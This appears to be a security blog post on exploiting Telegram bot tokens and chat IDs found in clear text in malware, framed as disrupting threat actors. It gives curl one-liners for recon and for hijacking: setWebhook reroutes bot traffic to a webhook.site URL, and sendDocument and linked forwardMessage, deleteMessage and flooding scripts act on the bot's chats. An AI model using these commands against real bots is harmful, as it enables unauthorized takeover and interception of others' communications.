## Overview

So, threat actors commonly use telegram bots. 

For usually one of two reasons:
1. Exfilitrate data
2. Receive commands

Now, there lies a big problem for the big bad hacker. To communicate with these bots you need two things
1. Bot API Key
2. Message ChatID

So, where does the attacker store these in there malicious code. It's gotta be somewhere right? Well.. it's normally in clear text. 

So, today I'm going to go over:
1. What we can do with this information
2. How we can exfilitrate data from bots (hypothetically ofc)
3. How we can disrupt there campaigns due to attacker stupidity 

### What is a Telegram Bot API Key and Chat ID

=== API KEY ===

Usually, with an API endpoint you need a key and a secret. For telegram you just need the key.

To create a bot open Telegram and message the "BotFather" ``/start`` and then ``/newbot`` and the rest is history.

=== CHAT ID ===

Each Chat in telegram has a chat ID. However, each user/bot also has a Chat ID. 

A ChatID is an identifer for a chat. So to query that chat, you need to query that chatid. This tells the bot what chat to interact with.

So if you want to read/view messages a bot has access to, you need a chatid so you can forward them to yourself.

### Recon One-Liners

So you can query all these endpoints super easy using ``curl`` in CLI. I'd do so from a Kali box with a VPN for piece of mind. 

Here a few helpful API endpoints you can hit to get information about the bot.
1. /getMe
- Accepts API Key as a parameter. Displays generic information about the bot. 

``curl -s -X GET "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getMe"``

2. /getChat
- Accepts a ChatID and API Key as parameters. Provides you information about the chat.

``curl -s -X GET "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getChat?chat_id=<CHAT_ID>"``

### Counter-Ops One-Liners

3. /setWebhook
- Accepts API Key as a parameter. Sets a webhook for the bot. Therefore, every command sent to it will be re-routed to your webhook.

``curl -s -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" -d "url=https://webhook.site/<PARAMETERS>"``

You can generate a free webhook at ``https://webhook.site``

4. /sendDocument
- Accepts a ChatID and API Key as parameters. I'll let your mind think about the possibilities for this one (think counter-ops) 

``curl -s -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendDocument" -F "chat_id=<CHAT_ID>" -F "document=@/path/to/file.pdf"``

### Scripts you'll actually use

5. /forwardMessage
- Accepts a ChatID and API Key as parameters. Easily the best endpoint. Essentially forwards all messages a bot can see in a chat to another chat. If you want to determine what the bot is being sent exactly this is the script for you.

[forwardMessage - Forward all messages from a chat the bot has access to](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/forwardMessage.sh)

6. /deleteMessage
- Accepts a ChatID and API Key as parameters. I've created a script for this, as curl doesn't work that well.

7. /sendMessage
- Great for testing how many messages a bot can send in a short period. Also great for testing if the bot can send messages to itself and/or others!

[sendMessage - Test Strength of Telegram Bot](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/sendMessage_strength_tester.sh)

[sendMessage - Send a Lovely Message to someone as the bot](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/sendMessage_send_lovely_message.sh)

### Putting these all together.

### Disclaimer

The following scripts should only be used on bots that you own and further that have not been used for any malicious activity as against Telegram's TOS.
